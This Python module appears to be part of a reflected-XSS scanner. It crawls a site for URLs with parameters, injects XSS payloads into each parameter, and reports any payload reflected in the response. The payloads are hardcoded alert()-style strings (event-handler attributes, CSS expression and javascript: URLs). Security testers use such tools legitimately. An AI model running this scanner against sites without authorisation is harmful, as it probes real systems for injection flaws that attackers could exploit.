# xss.py
import requests
from urllib.parse import urlparse, parse_qs, urlencode, quote
from payload_gen import get_xss_payloads
from colorama import Fore, Style
from crawler import crawl_urls  # Ensure crawler.py is present

def run_xss_tests(base_url, context=None):
    print(f"\n{Fore.CYAN}[*] Starting XSS tests on: {base_url}{Style.RESET_ALL}")
    if context:
        print(f"{Fore.CYAN}[*] Context-aware testing for: {context}{Style.RESET_ALL}")

    try:
        urls = crawl_urls(base_url)
    except ImportError:
        print(f"{Fore.RED}[!] Missing crawler module!{Style.RESET_ALL}")
        return

    if not urls:
        print(f"{Fore.YELLOW}[-] No URLs with parameters found to test.{Style.RESET_ALL}")
        return

    # Get context-specific payloads
    categorized_payloads = get_xss_payloads()
    
    if context:
        # Use context-specific payloads
        context_payloads = {
            'html': categorized_payloads.get('basic', []),
            'attribute': [
                '" onmouseover="alert(1)" "',
                '" onclick="alert(1)" "',
                '" onfocus="alert(1)" "'
            ],
            'script': [
                'alert(1)',
                'confirm(1)',
                'prompt(1)'
            ],
            'css': [
                'expression(alert(1))',
                'behavior:url(javascript:alert(1))'
            ]
        }
        payloads = context_payloads.get(context, categorized_payloads.get('basic', []))
    else:
        # Use all payloads
        payloads = [p for group in categorized_payloads.values() for p in group]

    for url in urls:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = payload
                test_url = f"{base}?{urlencode(test_params, doseq=True)}"

                try:
                    r = requests.get(test_url, timeout=5)
                    if payload in r.text:
                        print(f"{Fore.GREEN}[+] Reflected XSS Detected: {test_url}{Style.RESET_ALL}")
                        print(f"    → Payload: {payload}")
                        break  # Stop testing more payloads for this param
                except Exception as e:
                    print(f"{Fore.RED}[-] Error while testing {test_url}: {e}{Style.RESET_ALL}")
